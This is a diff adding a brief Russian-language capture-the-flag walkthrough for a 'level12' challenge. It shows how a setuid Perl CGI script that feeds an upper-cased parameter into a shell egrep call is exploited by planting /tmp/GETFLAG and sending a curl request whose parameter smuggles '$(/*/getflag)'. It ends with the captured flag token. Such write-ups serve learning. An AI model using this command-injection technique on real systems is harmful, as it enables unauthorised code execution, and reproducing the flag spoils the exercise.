@@ -1,0 +1,25 @@
+
+level12
+
+$ ls -l level12.pl
+-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
+
+Таким образом, быстро проанализировав этот скрипт perl, мы видим, что мы можем передать параметр x, который будет в верхнем регистре, и каждый пробел/новая строка и все, что после этого будет удалено.
+Затем он будет использоваться внутри оболочки выполнения egrep "^OUR_PARAM" /tmp/xd 2>&1. Возможно, мы каким-то образом захотим выполнить getflag:
+Таким образом, нам нужно будет создать скрипт в верхнем регистре в /tmp, и с помощью подоболочки и глобуса мы сможем его выполнить:
+
+$ netstat -tulpn | grep 4646
+tcp6       0      0 :::464
+
+$ cat > /tmp/GETFLAG <<EOF
+#!/bin/sh
+getflag > /tmp/flag
+EOF
+
+$ chmod +x /tmp/GETFLAG
+
+$ curl localhost:4646?x='$(/*/getflag)'
+
+..$ cat /tmp/flag
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+
